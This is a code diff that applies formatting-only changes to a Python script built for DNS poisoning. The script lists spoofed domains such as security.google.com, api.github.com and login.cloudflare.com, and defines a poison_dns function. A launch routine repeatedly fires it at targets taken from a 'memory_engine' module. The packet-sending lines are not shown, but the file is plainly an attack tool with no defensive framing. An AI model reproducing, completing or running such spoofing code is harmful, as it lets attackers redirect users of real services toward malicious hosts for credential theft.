@@ -1,4 +1,7 @@
-import socket, random, time
+import random
+import socket
+import time
+
 from memory_engine import get_top_targets
 
 FAKE_DOMAINS = [
@@ -6,8 +9,9 @@ FAKE_DOMAINS = [
     "security.google.com",
     "api.github.com",
     "login.cloudflare.com",
-    "ntp.org"
+    "ntp.org",
 ]
+
 
 def poison_dns(ip):
     spoofed = random.choice(FAKE_DOMAINS)
@@ -19,6 +23,7 @@ def poison_dns(ip):
     except Exception as e:
         print(f"[!] Failed to fake DNS: {e}")
 
+
 def launch():
     targets = get_top_targets()
     if not targets:
@@ -28,6 +33,7 @@ def launch():
     for _ in range(3):
         poison_dns(ip)
         time.sleep(1.5)
+
 
 if __name__ == "__main__":
     launch()
